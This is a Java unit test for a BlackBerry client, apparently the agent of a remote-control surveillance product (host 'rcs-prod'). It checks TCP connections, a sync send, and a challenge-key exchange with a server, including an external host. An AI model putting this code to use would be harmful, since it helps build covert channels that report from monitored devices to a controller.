package tests.unit;

import java.io.IOException;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;
import tests.AssertException;
import tests.TestUnit;
import tests.Tests;
import tests.accessor.TransferAccessor;
import blackberry.config.Keys;
import blackberry.transfer.DirectTcpConnection;
import blackberry.transfer.ProtocolException;

public class UT_Sync extends TestUnit {

	//#debug
	static Debug debug = new Debug("UT_Sync", DebugLevel.VERBOSE);

	String host = "rcs-prod";
	//String host = "192.168.1.149";
	int port = 80;

	TransferAccessor transfer;
	
	boolean remoteTest = false;

	public UT_Sync(String name, Tests tests) {
		super(name, tests);
		transfer = new TransferAccessor();
	}

	public boolean run() throws AssertException {
		ConnectionTest();
		Utils.sleep(2000);
		
		if(remoteTest)
		{
			ConnectionRemoteTest();
			Utils.sleep(2000);
		}
		
		SyncTest();
		Utils.sleep(2000);
		
		TransferTest();
		Utils.sleep(2000);
		
		//TransferSecureTest();
		//Utils.sleep(1000);
		return true;
	}

	private void SyncTest() throws AssertException {
		//#debug
		debug.info("- SyncTest -");
		transfer.init(host, port, false, false);
		
		//#debug
		debug.info("transfer sending");
		boolean ret = transfer.send();
		AssertThat(ret == true, "Doesn't send transfer");
				
	}

	private void TransferTest() throws AssertException {
		//#debug
		debug.info("- TransferTest -");
		transfer.init(host, port, false, false);
		try {
			transfer.ChallengeTest();
		} catch (ProtocolException e) {
			//#debug
debug.error("Protocol exception: " + e);
			throw new AssertException();
		}
	}
	
	private void TransferSecureTest() throws AssertException {
		//#debug
		debug.info("- TransferSecureTest -");
		transfer.init(host, 443, true, false);
		try {
			transfer.ChallengeTest();
		} catch (ProtocolException e) {
			//#debug
debug.error("Protocol exception: " + e);
			throw new AssertException();
		}
	}

	private void ConnectionTest() throws AssertException {
		//#debug
		debug.info("- ConnectionTest -");
		DirectTcpConnection connection = new DirectTcpConnection(host, port, false, false);
		boolean connected = connection.connect();
		AssertThat(connected, "not connected");

		connection.disconnect();
	}

	private void ConnectionRemoteTest() throws AssertException {
		//#debug
		debug.info("- ConnectionRemoteTest -");
		String remoteHost = "iperbole.suppose.it";
		int port = 8080;
		DirectTcpConnection connection = new DirectTcpConnection(remoteHost,
				port, false, false);
		boolean connected = connection.connect();
		AssertThat(connected, "not connected");

		try {
			//#debug
debug.trace("send");
			// connection.send("HelloWorld".getBytes());
			boolean ret = connection.send(Keys.getInstance().getChallengeKey());
			AssertThat(ret, "cannot send");
			//#debug
debug.trace("receive");
			byte[] rec = connection.receive(5);
			String string = new String(rec);
			//#debug
debug.trace("Received: " + string);
		} catch (IOException e) {
			//#debug
debug.error(e.toString());
		}

		connection.disconnect();
	}

}
